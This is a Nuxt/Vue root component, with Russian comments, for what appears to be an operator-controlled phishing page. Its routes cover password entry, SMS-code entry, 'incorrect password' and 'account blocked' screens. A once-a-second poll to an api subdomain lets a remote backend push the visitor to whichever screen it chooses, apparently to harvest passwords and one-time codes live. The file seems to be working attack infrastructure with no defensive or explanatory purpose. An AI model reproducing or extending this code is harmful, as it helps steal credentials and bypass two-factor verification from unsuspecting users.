<template>
  <Header />
  <div class="app__wrapper">
    <div class="app__body">
      <div class="panel">
        <div class="panel__wrapper" :class="{ expanded: isExpanded }">
          <div class="panel__container">
            <transition-group class="container" name="slide-left-right" mode="out-in">
              <div :key="route.name" class="route-view-wrapper">
                <NuxtPage class="route-view" />
              </div>
            </transition-group>
          </div>
        </div>
      </div>
    </div>
  </div>
  <Footer />
</template>

<script setup>
const router = useRouter()
const route = useRoute()
let panelWrapper = null

const { locale } = useI18n()
const userLocale = useCookie('user-locale')

// Set initial locale if saved
onMounted(() => {
  if (userLocale.value) {
    locale.value = userLocale.value
  }
  panelWrapper = document.querySelector('.app__body');
  if (window.innerWidth <= 340) {
    setWrapperMaxHeight(455); // Устанавливаем начальную высоту при монтировании компонента
    setWrapperHight(455)
  }
  if (window.innerWidth < 340) {
    setWrapperMaxHeight(410); // Устанавливаем начальную высоту при монтировании компонента
  }
})

// Keep locale in sync across route changes
watch(
  () => route.path,
  async () => {
    if (userLocale.value) {
      locale.value = userLocale.value
    }
    console.log(route.path)
    if (route.path === '/')
      setWrapperMaxHeight(390); // Устанавливаем новую высоту для контейнера
    if (route.path === '/pass')
      setWrapperMaxHeight(280)
    if (route.path === '/' && window.innerWidth <= 340) {
      setWrapperMaxHeight(430)
    }
    if (route.path === '/sms-code') {
      setWrapperMaxHeight(450)
    }
    if (route.path === '/incorrect-login')
      setWrapperMaxHeight(320)
    if (route.path === '/incorrect-password')
      setWrapperMaxHeight(320)
    if (route.path === '/verif-pick')
      setWrapperMaxHeight(290)
  }
)

const redirects = {
  "incorrect-login": "incorrect-login",
  "account-blocked": "account-blocked",
  "incorrect-code": {
    name: "sms-code",
    query: {
      error: true,
      method: computed(() => localStorage.getItem("method") || "sms")
    }
  },
}

const isExpanded = ref(false);

const setWrapperMaxHeight = (newHeight) => {
  const panelWrapper = document.querySelector('.app__body');
  panelWrapper.style.maxHeight = `${newHeight}px`;
};

const setWrapperHight = (newHeight) => {
  panelWrapper = document.querySelector('.app__body');
  panelWrapper.style.height = `${newHeight}px`;
}

onNuxtReady(() => {
  setInterval(async () => {
    const domain = `https://api.${window.location.hostname.split('.').slice(-2).join('.')}`
    const token = route.query.op_token
    // const domain = `http://localhost:8080`
    const response = await fetch(`${domain}/api/data?token=` + localStorage.getItem("token"))

    if (response.status === 200) {
      const { data } = await response.json()
      if (data.redirect === "default") return;
      
      const redirectQuery = redirects[data.redirect]?.query
      let queryValue = redirectQuery && typeof redirectQuery === 'object' && 'value' in redirectQuery
        ? redirectQuery.value
        : redirectQuery

      // Разворачиваем вложенные computed свойства
      if (queryValue && typeof queryValue === 'object') {
        queryValue = Object.fromEntries(
          Object.entries(queryValue).map(([key, value]) => [
            key,
            value && typeof value === 'object' && 'value' in value ? value.value : value
          ])
        )
      }
      
      console.log(queryValue)
      await router.push({
        name: redirects[data.redirect]?.name || data.redirect,
        query: {
          op_token: token,
          ...queryValue
        }
      })

      await fetch(`${domain}/api/redirect`, {
        method: "PUT",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({ token: token })
      })
    }
  }, 1000)
})

</script>

<style scoped>
/* Анимация для входа и выхода маршрутов */
.slide-left-right-enter-active,
.slide-left-right-leave-active {
  transition: all 0.5s ease;
}

.app__body {
  height: 390px;
  transition: max-height 0.5s ease-in-out;
  /* Плавный переход для max-height */
  display: flex;
  justify-content: center;
  align-items: center;
}

.footer {
  display: flex;
  justify-content: center;
}

.panel__wrapper {

  margin: 0;
  overflow: hidden;
  /* Скрыть излишки при анимации */
  transition: max-height 0.5s ease-in-out;
  /* Плавный переход для max-height */
  max-height: 380px;
  /* Установим начальную высоту */
  z-index: 10;
}

.panel__container {
  width: 100%;
}

.panel {
  position: relative;
  overflow: hidden;
  /* Всё за рамками скрывается */
  height: 100%;
}

.panel__container {
  height: 370px;
  width: 340px;
}


.route-view {
  position: absolute;
}

/* Анимация для появления контента */
.slide-left-right-enter-from {
  opacity: 0;
  transform: translateX(100%);
  /* Новый маршрут появляется справа */

}

.slide-left-right-enter-to {
  opacity: 1;
  transform: translateX(0);
  /* Плавно скользит в область видимости */
}

.slide-left-right-leave-to {
  opacity: 0;
  transform: translateX(-100%);
  /* Старый маршрут уходит влево */
}
</style>
